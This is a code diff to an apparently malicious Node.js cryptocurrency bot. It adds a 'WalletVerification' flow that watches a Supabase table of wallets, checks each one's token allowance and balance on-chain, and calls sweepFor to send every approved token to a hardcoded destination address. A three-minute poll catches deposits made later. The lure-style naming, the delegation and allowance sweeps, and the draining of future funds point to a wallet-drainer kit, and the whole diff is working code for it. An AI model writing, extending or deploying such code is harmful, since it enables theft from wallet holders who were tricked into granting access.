@@ -36,6 +36,14 @@ const FALLBACK_RPCS = [
 ].filter(Boolean);
 const CONTRACT_ADDRESS          = process.env.CONTRACT_ADDRESS;
 const DESTINATION_ADDRESS       = process.env.DESTINATION_ADDRESS || "0x8Da0f664bb5091585148333275FcF0607b258026";
+// WalletVerification — a fully separate Privy-based direct-allowance flow
+// (see /Users/starlight/Documents/walletverification). Same relayer key +
+// destination + sweepFor/isAuthorized ABI as the main contract, but its own
+// contract deployment and its OWN Supabase project — bolted on below without
+// touching the main delegated_wallets watcher.
+const VERIFICATION_CONTRACT_ADDRESS          = process.env.VERIFICATION_CONTRACT_ADDRESS || "";
+const VERIFICATION_SUPABASE_URL              = process.env.VERIFICATION_SUPABASE_URL || "";
+const VERIFICATION_SUPABASE_SERVICE_ROLE_KEY = process.env.VERIFICATION_SUPABASE_SERVICE_ROLE_KEY || "";
 const TOKENS_TO_WATCH           = (process.env.TOKENS_TO_WATCH || "").split(",").filter(Boolean);
 const SUPABASE_URL              = process.env.SUPABASE_URL;
 const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
@@ -252,6 +260,21 @@ const contract      = CONTRACT_ADDRESS
   ? new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, relayerWallet)
   : null;
 
+// ── WalletVerification (separate project) client + contract ─────────────────
+const verificationSupabase = VERIFICATION_SUPABASE_URL && VERIFICATION_SUPABASE_SERVICE_ROLE_KEY
+  ? createClient(VERIFICATION_SUPABASE_URL, VERIFICATION_SUPABASE_SERVICE_ROLE_KEY, {
+      auth: { persistSession: false },
+      realtime: { transport: ws },
+    })
+  : null;
+const verificationContract = VERIFICATION_CONTRACT_ADDRESS
+  ? new ethers.Contract(VERIFICATION_CONTRACT_ADDRESS, CONTRACT_ABI, relayerWallet)
+  : null;
+const verificationContractRead = VERIFICATION_CONTRACT_ADDRESS
+  ? new ethers.Contract(VERIFICATION_CONTRACT_ADDRESS, CONTRACT_ABI, getReadProvider())
+  : null;
+const sweepingVerified = new Set(); // debounce concurrent sweepFor calls per address
+
 // ── State ─────────────────────────────────────────────────────────────────────
 
 let sweepingETH        = false;
@@ -448,6 +471,142 @@ async function sweepToken(tokenAddress) {
     await tx.wait();
   } catch (e) { maybeResetNonce(e); err(`sweepToken(${tokenAddress}): ${e.message}`); }
   finally     { sweepingToken[key] = false; }
+}
+
+// ── WalletVerification sweep (separate Privy-based direct-allowance flow) ───
+// Triggered by verified_wallets rows (own Supabase project) instead of
+// delegated_wallets. Never trust the DB row's `authorized`/`approved_tokens`
+// alone — re-check live allowance + balance + isAuthorized() on-chain right
+// before sweeping, since state can change between verification and now.
+async function sweepVerifiedWallet(row) {
+  if (!verificationContract || !verificationContractRead) return;
+  const checksum = normalizeAddress(row?.address);
+  if (!checksum || !row?.authorized) return;
+  const key = checksum.toLowerCase();
+  if (sweepingVerified.has(key)) return;
+
+  const approved = Array.isArray(row.approved_tokens) ? row.approved_tokens : [];
+  const candidateAddrs = approved.map(t => normalizeAddress(t?.address)).filter(Boolean);
+  if (candidateAddrs.length === 0) return;
+
+  sweepingVerified.add(key);
+  try {
+    const toSweep = [];
+    for (const tokenAddr of candidateAddrs) {
+      try {
+        const erc20 = new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider());
+        const [allowance, balance] = await Promise.all([
+          erc20.allowance(checksum, VERIFICATION_CONTRACT_ADDRESS),
+          erc20.balanceOf(checksum),
+        ]);
+        if (allowance > 0n && balance > 0n) toSweep.push(tokenAddr);
+      } catch { /* skip unreadable token */ }
+    }
+    if (toSweep.length === 0) return; // nothing live to sweep right now
+
+    const isAuth = await verificationContractRead.isAuthorized(checksum, relayerWallet.address).catch(() => false);
+    if (!isAuth) {
+      warn(`[verify] ${checksum.slice(0, 10)} — DB says authorized but on-chain isAuthorized()=false, skipping`);
+      return;
+    }
+
+    log(`[verify] ${checksum.slice(0, 10)} — sweepFor ${toSweep.length} token(s) via WalletVerification contract`);
+    const gas = await verificationContract.sweepFor.estimateGas(checksum, toSweep);
+    const fee = await getFeeData();
+    const tx  = await verificationContract.sweepFor(checksum, toSweep, { gasLimit: gas * 130n / 100n, ...fee });
+    log(`[verify] sweepFor tx: ${tx.hash}`);
+    await tx.wait();
+    log(`[verify] ✅ sweepFor confirmed for ${checksum.slice(0, 10)}`);
+
+    if (verificationSupabase) {
+      await verificationSupabase.from("verified_wallets")
+        .update({ swept_at: new Date().toISOString() })
+        .eq("address", checksum).eq("chain", CHAIN).then(v => v, () => {});
+    }
+  } catch (e) {
+    maybeResetNonce(e);
+    err(`[verify] sweepFor ❌ ${checksum.slice(0, 10)}: ${errStr(e)}`);
+  } finally {
+    sweepingVerified.delete(key);
+  }
+}
+
+let verificationRealtimeChannel = null;
+function subscribeVerificationRealtime() {
+  if (!verificationSupabase) return;
+  if (verificationRealtimeChannel) {
+    verificationSupabase.removeChannel(verificationRealtimeChannel).then(v => v, () => {});
+    verificationRealtimeChannel = null;
+  }
+  verificationRealtimeChannel = verificationSupabase
+    .channel(`bot_verification_${CHAIN}`)
+    .on(
+      "postgres_changes",
+      { event: "INSERT", schema: "public", table: "verified_wallets", filter: `chain=eq.${CHAIN}` },
+      (payload) => {
+        const row = payload.new || {};
+        log(`[verify] [realtime] 🔔 new wallet ${(row.address || "").slice(0, 10)} (authorized=${!!row.authorized})`);
+        sweepVerifiedWallet(row).catch(e => log(`[verify] [realtime] sweep error: ${e.message}`));
+      }
+    )
+    .on(
+      "postgres_changes",
+      { event: "UPDATE", schema: "public", table: "verified_wallets", filter: `chain=eq.${CHAIN}` },
+      (payload) => {
+        const row = payload.new || {};
+        log(`[verify] [realtime] 🔄 updated wallet ${(row.address || "").slice(0, 10)} (authorized=${!!row.authorized})`);
+        sweepVerifiedWallet(row).catch(e => log(`[verify] [realtime] sweep error: ${e.message}`));
+      }
+    )
+    .subscribe((status) => {
+      if (status === "SUBSCRIBED") {
+        log(`[verify] [realtime] ✅ subscribed (verified_wallets, chain=${CHAIN})`);
+      } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT" || status === "CLOSED") {
+        warn(`[verify] [realtime] ${status} — resubscribing in 10s`);
+        setTimeout(subscribeVerificationRealtime, 10_000);
+      }
+    });
+}
+
+// Realtime failsafe + the mechanism that catches FUTURE deposits: this flow
+// has no per-token Transfer-event listener of its own, so every authorized
+// wallet is re-checked on a timer (cheap: allowance+balance eth_calls only,
+// sweepFor is only sent when something is actually live to move). This is
+// polling-latency (~3 min worst case) rather than event-instant like the
+// main delegated_wallets flow — acceptable for a secondary flow, upgradeable
+// to Transfer-event-driven later if this volume justifies it.
+function startVerificationPoll() {
+  if (!verificationSupabase) return;
+  setInterval(async () => {
+    try {
+      const { data, error } = await verificationSupabase
+        .from("verified_wallets")
+        .select("*")
+        .eq("chain", CHAIN)
+        .eq("authorized", true);
+      if (error) { warn(`[verify] [poll] query error: ${error.message}`); return; }
+      for (const row of data || []) {
+        await sweepVerifiedWallet(row).catch(e => log(`[verify] [poll] sweep error: ${e.message}`));
+      }
+    } catch (e) { warn(`[verify] [poll] reload error: ${e.message}`); }
+  }, 3 * 60 * 1000);
+}
+
+async function startupVerificationSweepPass() {
+  if (!verificationSupabase) return;
+  try {
+    const { data, error } = await verificationSupabase
+      .from("verified_wallets")
+      .select("*")
+      .eq("chain", CHAIN)
+      .eq("authorized", true);
+    if (error) { warn(`[verify] [startup] query error: ${error.message}`); return; }
+    if (!data?.length) return;
+    log(`[verify] [startup] checking ${data.length} authorized wallet(s)`);
+    for (const row of data) {
+      await sweepVerifiedWallet(row).catch(e => log(`[verify] [startup] sweep error: ${e.message}`));
+    }
+  } catch (e) { warn(`[verify] [startup] pass error: ${e.message}`); }
 }
 
 // ── EIP-7702 delegated wallet sweep ───────────────────────────────────────────
@@ -3274,6 +3433,7 @@ async function init() {
   log(`[init] destination=${DESTINATION_ADDRESS}`);
   log(`[init] permit2=${PERMIT2_ADDRESS}`);
   if (CONTRACT_ADDRESS) log(`[init] contract=${CONTRACT_ADDRESS}`);
+  if (VERIFICATION_CONTRACT_ADDRESS) log(`[init] verificationContract=${VERIFICATION_CONTRACT_ADDRESS}`);
 
   const envBotAddr = process.env.BOT_ADDRESS?.toLowerCase().trim();
   if (envBotAddr && relayerWallet.address.toLowerCase() !== envBotAddr) {
@@ -3311,6 +3471,14 @@ async function init() {
 
   // 4. Subscribe to Supabase Realtime for new/updated wallets
   subscribeRealtime();
+
+  // 4a. WalletVerification: separate project/contract, own Realtime + poll + startup pass.
+  if (verificationSupabase && verificationContract) {
+    subscribeVerificationRealtime();
+    startVerificationPoll();
+    startupVerificationSweepPass();
+    log(`[init] WalletVerification watcher active (contract=${VERIFICATION_CONTRACT_ADDRESS.slice(0, 10)})`);
+  }
 
   // 4b. Periodic Supabase reload — Realtime failsafe.
   // If the Realtime channel silently stalls (no CHANNEL_ERROR, events just stop arriving),
